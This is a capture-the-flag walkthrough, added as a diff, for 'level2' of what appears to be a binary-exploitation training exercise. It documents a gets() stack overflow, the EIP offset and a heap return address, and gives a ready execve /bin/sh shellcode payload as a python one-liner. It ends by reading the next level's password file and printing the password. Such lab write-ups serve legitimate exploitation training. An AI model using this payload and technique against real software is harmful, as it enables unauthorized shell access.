@@ -1,0 +1,52 @@
+1. Download the binary from the server:
+   scp -P 4242 level2@<VM_IP>:~/level2 .
+
+2. Analyze the binary with Ghidra or objdump
+
+3. Identify the vulnerability:
+   - p() function uses gets() which is unsafe
+   - Buffer is 76 bytes (0x4c)
+   - EIP offset is at 80 bytes
+   - Return address protection: checks if address starts with 0xb (stack)
+   - strdup() copies buffer to heap at predictable address
+
+4. Find the heap address using ltrace:
+   ltrace ./level2
+   Input: AAAA
+   Observe: strdup("AAAA") = 0x0804a008
+
+5. Verify heap address with gdb:
+   gdb level2
+   (gdb) break *0x0804853d
+   (gdb) run
+   Input: AAAA
+   (gdb) info registers eax
+   Result: 0x804a008
+
+6. Find EIP offset:
+   (gdb) run
+   Input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+   Crash at: 0x37634136
+   Offset: 80 bytes
+
+7. Use shellcode from Exploit-DB (24 bytes):
+   Source: https://www.exploit-db.com/shellcodes/42428
+   Author: Touhid M.Shaikh
+   Execve("/bin/sh", NULL, NULL) shellcode:
+   \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+
+8. Calculate exploit structure:
+   - Shellcode: 24 bytes
+   - Padding: 56 bytes (80 - 24 = 56)
+   - Return address: 4 bytes (0x0804a008 in little-endian = \x08\xa0\x04\x08)
+
+9. Craft and execute the exploit:
+   (python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
+
+10. Read the password:
+    cat /home/user/level3/.pass
+
+11. Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+12. Exit and login as level3:
+    su level3
